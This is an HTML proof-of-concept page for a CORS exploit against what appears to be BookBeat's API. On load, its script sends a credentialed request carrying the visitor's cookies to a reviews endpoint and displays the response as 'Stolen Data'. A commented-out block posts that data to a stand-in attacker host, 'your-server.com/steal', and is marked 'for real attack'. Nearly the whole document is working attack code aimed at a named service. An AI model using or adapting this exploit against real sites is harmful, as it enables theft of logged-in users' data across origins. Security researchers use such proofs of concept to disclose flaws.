<!DOCTYPE html>
<html>
<head>
    <title>BookBeat CORS Exploit PoC</title>
</head>
<body>
    <h2>Testing CORS Data Theft...</h2>
    <pre id="output">Waiting...</pre>

    <script>
        async function exploit() {
            const target = 'https://api.bookbeat.com/api/reviews/at/book/1675566?limit=10&offset=0';
            const output = document.getElementById('output');

            try {
                const response = await fetch(target, {
                    method: 'GET',
                    credentials: 'include', // ðŸ‘ˆ SENDS COOKIES IF USER IS LOGGED IN
                    headers: {
                        'Accept': '*/*'
                    }
                });

                // Check what CORS headers browser allowed
                const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
                output.textContent = `CORS Allowed Origin: ${allowedOrigin}\n\n`;

                if (response.ok) {
                    const data = await response.json();
                    output.textContent += `SUCCESS! Stolen Data:\n${JSON.stringify(data, null, 2)}`;

                    // ðŸš¨ Exfiltrate to your server (for real attack)
                    // fetch('https://your-server.com/steal', {
                    //     method: 'POST',
                    //     body: JSON.stringify(data)
                    // });
                } else {
                    output.textContent += `Failed: ${response.status} ${response.statusText}`;
                }
            } catch (err) {
                output.textContent = `Error: ${err.message}\n\nCheck Browser Console (F12) for CORS errors.`;
            }
        }

        exploit();
    </script>
</body>
</html>
